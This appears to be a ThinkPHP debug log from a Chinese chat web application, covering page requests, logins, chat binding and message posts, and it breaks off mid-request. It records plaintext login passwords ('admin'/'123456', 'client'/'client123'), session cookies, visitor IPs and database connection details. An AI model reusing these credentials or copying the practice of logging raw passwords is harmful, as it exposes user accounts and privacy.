+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T13:53:28+08:00 ] 0.0.0.0 101.107.43.164 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.048450s][吞吐率：20.64req/s] [内存消耗：2,494.85kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T13:53:37+08:00 ] 0.0.0.0 101.107.43.164 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.069174s][吞吐率：14.46req/s] [内存消耗：1,855.27kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=d39f3j40j5u5fbensiljc3jpt5',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T13:53:43+08:00 ] 0.0.0.0 101.107.43.164 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.211425s][吞吐率：4.73req/s] [内存消耗：3,391.53kb] [文件加载：61]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '30',
+  'x-original-url' => '/home/login/login_think.html',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=d39f3j40j5u5fbensiljc3jpt5',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'password' => '123456',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002117s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005848s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'admin' LIMIT 1 [ RunTime:0.027599s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:40:25+08:00 ] 0.0.0.0 203.208.60.213 GET /robots.txt
+[ info ] eddchat.oumaikeji.com/robots.txt [运行时间：0.245146s][吞吐率：4.08req/s] [内存消耗：1,853.41kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'robots.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/robots.txt',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-encoding' => 'gzip,deflate,br',
+  'accept' => 'text/plain,text/html,*/*',
+  'connection' => 'Keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:40:25+08:00 ] 0.0.0.0 203.208.60.213 GET /admin/login/favicon.ico
+[ info ] eddchat.oumaikeji.com/admin/login/favicon.ico [运行时间：0.139410s][吞吐率：7.17req/s] [内存消耗：2,287.69kb] [文件加载：52]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'favicon.ico',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/admin/login/favicon.ico',
+  'user-agent' => 'Googlebot-Image/1.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept-encoding' => 'gzip,deflate,br',
+  'accept' => '*/*',
+  'connection' => 'Keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:52:19+08:00 ] 0.0.0.0 125.64.231.82 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.152358s][吞吐率：6.56req/s] [内存消耗：2,494.88kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:52:22+08:00 ] 0.0.0.0 125.64.231.82 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.049170s][吞吐率：20.34req/s] [内存消耗：1,854.87kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:52:29+08:00 ] 0.0.0.0 101.226.33.237 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.042191s][吞吐率：23.70req/s] [内存消耗：2,494.35kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch, br',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:52:31+08:00 ] 0.0.0.0 61.151.226.16 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.045551s][吞吐率：21.95req/s] [内存消耗：2,494.62kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch, br',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:52:47+08:00 ] 0.0.0.0 125.64.231.82 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.039961s][吞吐率：25.02req/s] [内存消耗：2,495.47kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T14:53:07+08:00 ] 0.0.0.0 125.64.231.82 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.182242s][吞吐率：5.49req/s] [内存消耗：3,540.46kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001960s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006594s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client' LIMIT 1 [ RunTime:0.000806s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501397587',`last_login_ip`='125.64.231.82',`user_hits`=25  WHERE  `id` = 54 [ RunTime:0.000678s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:53:08+08:00 ] 0.0.0.0 125.64.231.82 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.248477s][吞吐率：4.02req/s] [内存消耗：3,551.95kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4; CUID=E7-9q',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001788s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005020s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.001092s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000603s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000844s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000592s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:53:09+08:00 ] 0.0.0.0 125.64.231.82 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.073620s][吞吐率：13.58req/s] [内存消耗：3,426.30kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4; CUID=%3DArzI',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000009',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001097s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.007873s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000828s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000679s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:53:10+08:00 ] 0.0.0.0 125.64.231.82 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.065650s][吞吐率：15.23req/s] [内存消耗：3,454.62kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4; CUID=1-yqz',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001093s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006579s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000750s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:53:15+08:00 ] 0.0.0.0 125.64.231.82 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.081083s][吞吐率：12.33req/s] [内存消耗：3,434.53kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '31',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4; CUID=aFsHX',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => 'a',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002172s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006526s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000720s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000577s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005611s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501397595' , 54 , 0 , 'a') [ RunTime:0.000565s ]
+---------------------------------------------------------------
+[ 2017-07-30T14:53:19+08:00 ] 0.0.0.0 125.64.231.82 POST /home/chat/find_client_name.html
+[ info ] eddchat.oumaikeji.com/home/chat/find_client_name.html [运行时间：0.113582s][吞吐率：8.80req/s] [内存消耗：3,409.77kb] [文件加载：60]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'find_client_name',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '30',
+  'x-original-url' => '/home/chat/find_client_name.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=3sbjgjd1rpj1k6840e136e69o4; CUID=Mfi0v',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000a',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->find_client_name[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001224s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006848s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000781s ]
+---------------------------------------------------------------
+[ 2017-07-30T15:04:02+08:00 ] 0.0.0.0 113.116.199.243 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.048792s][吞吐率：20.50req/s] [内存消耗：2,494.91kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
